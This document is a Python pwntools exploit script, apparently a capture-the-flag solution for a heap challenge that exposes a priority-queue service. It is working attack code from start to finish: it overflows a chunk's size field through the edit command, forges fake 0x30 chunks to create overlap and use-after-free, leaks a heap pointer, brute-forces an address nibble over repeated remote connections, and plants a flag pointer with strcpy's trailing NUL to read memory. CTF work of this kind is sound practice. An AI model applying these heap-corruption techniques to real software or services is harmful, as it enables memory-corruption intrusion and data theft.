#!/usr/bin/env python3
from pwn import *
import argparse
import sys


HOST = "priority-queue.opus4-7.b01le.rs"
PORT = 8443

PROMPT = b"Operation (insert/delete/peek/edit/count/quit): \n"
MSG = b"Message: \n"

FLAG_OFFSET = 0x480
LEAK_PREFIX = 0x94F0

elf = context.binary = ELF("./chall", checksec=False)


def start(args):
    if args.remote:
        io = remote(args.host, args.port, ssl=True, sni=args.host)
    else:
        io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chall"])
    io.recvuntil(PROMPT)
    return io


def insert(io, data):
    io.sendline(b"insert")
    io.recvuntil(MSG)
    io.sendline(data)
    io.recvuntil(PROMPT)


def delete(io):
    io.sendline(b"delete")
    return io.recvuntil(PROMPT, drop=True)


def peek(io):
    io.sendline(b"peek")
    return io.recvuntil(PROMPT, drop=True)


def edit(io, data):
    io.sendline(b"edit")
    io.recvuntil(MSG)
    io.send(data)
    io.recvuntil(PROMPT)


def phase1_heap_leak(io):
    # A overflows into B.size, then free(a/b/c) to create a small overlap/UAF.
    insert(io, b"a")
    insert(io, b"b")
    insert(io, b"c")
    insert(io, b"\xff")

    edit(io, b"A" * 0x18 + b"\x41")
    delete(io)
    delete(io)
    delete(io)

    # Reuse the freed chunks so chunk c still carries 6 useful bytes of a heap pointer.
    insert(io, b"y" * 0x20 + b"QQQQQQ")
    insert(io, b"\xff")
    delete(io)

    # Make the leaked chunk sort after the letters used in phase 2.
    edit(io, p16(LEAK_PREFIX))
    leak = peek(io).rstrip(b"\n")
    if len(leak) < 6:
        raise RuntimeError(f"short leak: {leak!r}")

    heap_hi = u32(leak[2:6])
    return leak, heap_hi


def phase2_flag_read(io, flag_ptr):
    # Grow the queue from 8 to 16 so the new backing array lands after a small chunk.
    for ch in b"mnopqrsz":
        insert(io, bytes([ch]))

    for _ in range(5):
        delete(io)

    if peek(io).rstrip(b"\n") != b"r":
        raise RuntimeError("unexpected heap order before fake free")

    # Turn s into a fake 0x30 chunk, free it, then use strcpy's trailing NUL
    # to write exactly 6 bytes of flag_ptr into array[0].
    edit(io, b"R" * 0x18 + b"\x31")
    delete(io)
    delete(io)

    payload = b"\x90" * 32 + p64(flag_ptr)[:6]
    insert(io, payload)
    return peek(io)


def attempt(args, nibble):
    io = start(args)
    try:
        leak, heap_hi = phase1_heap_leak(io)
        heap_base = (heap_hi << 16) | (nibble << 12)
        flag_ptr = heap_base + FLAG_OFFSET

        log.info(
            "leak=%r heap_hi=%#x nibble=%#x heap_base=%#x flag_ptr=%#x",
            leak,
            heap_hi,
            nibble,
            heap_base,
            flag_ptr,
        )

        data = phase2_flag_read(io, flag_ptr)
        return data
    finally:
        io.close()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", type=int, default=PORT)
    parser.add_argument("--nibble", type=lambda x: int(x, 0))
    parser.add_argument("--rounds", type=int, default=4)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    context.log_level = "debug" if args.debug else "info"

    if args.nibble is not None:
        data = attempt(args, args.nibble)
        sys.stdout.buffer.write(data)
        if not data.endswith(b"\n"):
            sys.stdout.buffer.write(b"\n")
        return 0

    for round_id in range(args.rounds):
        for nibble in range(0x10):
            try:
                data = attempt(args, nibble)
                log.info("round=%d nibble=%#x -> %r", round_id, nibble, data)
                if b"{" in data:
                    sys.stdout.buffer.write(data)
                    if not data.endswith(b"\n"):
                        sys.stdout.buffer.write(b"\n")
                    return 0
            except EOFError:
                log.info("round=%d nibble=%#x crashed", round_id, nibble)
            except Exception as exc:
                log.info("round=%d nibble=%#x failed: %s", round_id, nibble, exc)

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
